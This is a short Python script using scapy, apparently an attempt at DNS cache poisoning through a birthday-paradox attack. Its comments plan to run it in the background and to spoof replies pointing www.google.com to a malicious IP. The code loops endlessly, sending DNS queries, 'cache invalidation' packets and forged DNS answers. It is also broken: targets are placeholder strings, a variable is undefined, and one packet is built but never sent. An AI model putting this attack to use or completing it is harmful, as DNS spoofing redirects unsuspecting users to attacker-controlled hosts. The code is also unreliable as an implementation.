

# # Part 2 - Invect via birthday paradox attack
# make pico launch B-Day-Attack exe
# make it run in background
# send x amount of dns requests
# if any reply comes with a IP apart from our malicious IP reject and send a cache invalidation packet
# send x amount of invalidation or dns requests
# send x amount of fake replies with different 16-bit values
# if succeded, end, else repeat from step 4



import scapy.all as scapy
import random
import time
import os
import sys

dst = "temp"
rdata = "temp"

# Function to send DNS request
def send_dns_request():
    # Send DNS request
    dns_request = scapy.DNS(rd=1, qd=scapy.DNSQR(qname="www.google.com"))
    scapy.send(dns_request, verbose=0)

# Function to send cache invalidation packet
def send_cache_invalidation_packet():
    # Send cache invalidation packet
    cache_invalidation_packet = scapy.IP(dst=dst)/scapy.UDP(dport=53)/scapy.DNS(rd=1, qd=scapy.DNSQR(qname="www.google.com"))
    dns_invalidation_packet = scapy.IP(dst="8.8.8.8") / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=target_domain, qtype='A', qclass='IN', opcode=5))

    scapy.send(cache_invalidation_packet, verbose=0)

# Function to send fake replies
def send_fake_replies():
    # Send fake replies
    fake_replies = scapy.IP(dst=dst)/scapy.UDP(dport=53)/scapy.DNS(rd=1, qd=scapy.DNSQR(qname="www.google.com"), an=scapy.DNSRR(rrname="www.google.com", rdata=rdata))
    scapy.send(fake_replies, verbose=0)


# Main function
def main():
    # Send DNS request
    send_dns_request()
    # Send cache invalidation packet
    send_cache_invalidation_packet()
    # Send fake replies
    send_fake_replies()
    # Repeat the process
    while True:
        # Send DNS request
        send_dns_request()
        # Send cache invalidation packet
        send_cache_invalidation_packet()
        # Send fake replies
        send_fake_replies()
        # Sleep for 1 second
        time.sleep(1)
    
# Run the main function
main()
